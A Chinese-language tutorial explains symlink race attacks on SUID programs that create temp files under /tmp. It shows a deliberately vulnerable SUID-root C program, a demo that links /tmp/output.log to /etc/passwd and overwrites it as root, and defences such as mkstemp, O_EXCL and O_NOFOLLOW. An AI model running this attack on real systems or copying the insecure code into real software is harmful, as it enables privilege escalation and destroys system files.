
## 一、原理

1. **不安全的临时文件创建**
   很多程序为了写入临时数据，会在 `/tmp`、`/var/tmp` 等可写目录下用固定或可预测的文件名（如 `/tmp/output.log`）调用 `fopen()`、`open()` 等，而**没有**先检测文件是否已存在或是否为符号链接。

2. **竞态条件**
   攻击者可以在 SUID 程序运行之前，快速创建一个同名的符号链接，指向任意目标（如 `/etc/shadow`、`/etc/passwd`、某个关键配置文件等）。当程序打开该路径进行写操作时，就会写到链接指向的真正文件上，以 root 身份覆盖或修改它。

3. **关键点**

   * 攻击者必须能在程序运行前创建符号链接。
   * SUID 程序没有调用诸如 `O_EXCL`、`lstat()` 检查或 `fstat()` 验证文件类型，也没用 `mkstemp()` 之类安全接口。
   * 目标文件系统对符号链接没有额外保护。

---

## 二、示例演示

下面在一台测试机上，创建一个极简 SUID 程序 `write_tmp`，然后演示如何通过符号链接竞态将它写入 `/etc/passwd`。

### 1. 编写并安装 SUID 演示程序

```c
/* write_tmp.c */
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *tmp = "/tmp/output.log";
    FILE *f = fopen(tmp, "w");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fprintf(f, "PWNED_BY_RACE_CONDITION\n");
    fclose(f);
    printf("[+] 写入 %s 完成\n", tmp);
    return 0;
}
```

```bash
# 编译并设置 SUID root
gcc write_tmp.c -o write_tmp
sudo chown root:root write_tmp
sudo chmod 4755 write_tmp

# 验证
$ ls -l write_tmp
-rwsr-xr-x 1 root root ... write_tmp

# 正常执行效果
$ ./write_tmp
[+] 写入 /tmp/output.log 完成
$ cat /tmp/output.log
PWNED_BY_RACE_CONDITION
```

### 2. 发动竞态：符号链接劫持

1. **提前创建指向系统关键文件的符号链接**

   ```bash
   rm -f /tmp/output.log
   ln -s /etc/passwd /tmp/output.log
   ```
2. **执行 SUID 程序**

   ```bash
   $ ./write_tmp
   [+] 写入 /tmp/output.log 完成
   ```
3. **验证覆盖结果**

   ```bash
   $ head -n 5 /etc/passwd
   PWNED_BY_RACE_CONDITION
   ...
   ```

   你会发现 `/etc/passwd` 顶部第一行被替换成 “PWNED\_BY\_RACE\_CONDITION”，说明程序以 root 身份写入了本不该写的文件。

---

## 三、安全防护

1. **使用安全临时文件接口**

   * `mkstemp()`：原子创建唯一新文件。
   * `open(path, O_CREAT|O_EXCL)`：确保文件不存在时才创建。

2. **检查并拒绝符号链接**

   * 在打开前用 `lstat()` 判断 `S_ISLNK()`，若是链接则拒绝；
   * 或调用 `open(..., O_NOFOLLOW)`。

3. **最小化 SUID**
   只对确实需要提权的二进制打 SUID，其他功能改用 `sudo` 策略控制。

4. **启用安全模块**
   AppArmor/SELinux 可限制 SUID 程序对 `/etc`、`/tmp` 等目录的写入权限，即便代码有漏洞也难以写入关键路径。

---

通过以上示例，可清晰看到——只要 SUID 程序在可写目录创建临时文件时没有做安全检查，攻击者就能通过符号链接竞态，将任意文件以 root 权限覆盖，实现提权或破坏系统完整性。
